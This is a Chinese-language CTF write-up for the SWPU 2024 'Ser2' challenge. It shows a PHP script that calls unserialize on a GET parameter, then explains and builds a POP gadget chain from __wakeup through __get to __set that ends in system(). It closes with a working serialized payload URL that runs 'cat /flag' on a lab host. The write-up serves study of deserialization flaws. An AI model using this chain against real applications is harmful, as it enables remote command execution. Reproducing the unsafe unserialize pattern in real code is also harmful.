---
title: "SWPU 2024 新生引导-Ser2"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/靶场实例/反序列化/SWPU 2024 新生引导-Ser2/
categories:
  - 网安笔记
  - 靶场实例
  - 反序列化
  - SWPU 2024 新生引导-Ser2
tags:
  - Study
---

找到的代码
```php
<?php
class step0ne{
    public $nl;
    public $tac;
    public $less;
    public function __wakeup(){
        $this->nl->base64;
    }
    
}
class steptw0{
    public $rev;
    public $uniq;
    public $more;
    public function __get($name){
        $this->rev->tail='sed';
    }

}
class stepthr33{
    public $sort;
    public $file;
    public $head;
    public function __set($name, $value){
        system($this->sort);
    }
}
$a=$_GET['CTF'];
unserialize($a);
怎么这些属性有点像linux读取文件的指令啊，快快收藏起来吧，麻麻再也不用担心我做不来题了
```

考的是反序列化 pop链
先来找尾巴 stepthr33类里面有system函数 那我们肯定是要从这里执行命令 那么这就是尾巴
那么再来找一下开头
step0ne里面有个wakeup方法 是入口方法(类的对象被调用了就会使用) 那么桥梁就是steptw0了

直接构造payload
```php
<?php
class step0ne{
    public $nl;
    public $tac;
    public $less;
    public function __wakeup(){
        $this->nl->base64;
    }

}
class steptw0{
    public $rev;
    public $uniq;
    public $more;
    public function __get($name){
        $this->rev->tail='sed';
    }

}
class stepthr33{
    public $sort;
    public $file;
    public $head;
    public function __set($name, $value){
        system($this->sort);
    }
}
$a=new step0ne();
$a->nl=new steptw0();
$a->nl->rev = new stepthr33();
$a->nl->rev->sort = 'cat ./flag';
echo serialize($a);
?>
```

最后得出来的url就是
```txt
node4.anna.nssctf.cn:28932/Ditie.php?CTF=O:7:"step0ne":3:{s:2:"nl";O:7:"steptw0":3:{s:3:"rev";O:9:"stepthr33":3:{s:4:"sort";s:9:"cat /flag";s:4:"file";N;s:4:"head";N;}s:4:"uniq";N;s:4:"more";N;}s:3:"tac";N;s:4:"less";N;}
```
